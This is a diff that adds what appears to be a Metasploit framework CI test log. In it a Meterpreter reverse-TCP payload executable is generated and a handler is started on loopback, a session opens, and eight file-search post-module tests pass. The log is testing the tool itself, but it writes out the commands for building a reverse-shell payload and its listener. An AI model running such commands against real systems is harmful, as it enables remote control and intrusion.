@@ -1,0 +1,33 @@
+use windows/meterpreter_reverse_tcp
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 78 closed.
+[4mmsf6[0m post([1m[31mtest/registry[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220124-3356-lly69.exe -f exe MeterpreterTryToFork=false lport=6079 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mwindows/meterpreter_reverse_tcp[0m) [0m> [*] Writing 250368 bytes to D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220124-3356-lly69.exe...
+[4mmsf6[0m payload([1m[31mwindows/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 74
+[4mmsf6[0m payload([1m[31mwindows/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6079 
+[*] Meterpreter session 79 opened (127.0.0.1:6079 -> 127.0.0.1:50331 ) at 2022-01-24 01:27:40 +0000
+use test/search
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> run session=79 addentropy=true verbose=true
+
+[*] Setup: changing working directory to C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Source File Name: meterpreter-test-hecoviwu.txt
+[*] Running against session 79
+[*] Session type is meterpreter and platform is windows
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[+] should search with date inclusive of exact date
+[*] Testing complete in 0.6793602
+[*] Passed: 8; Failed: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> 
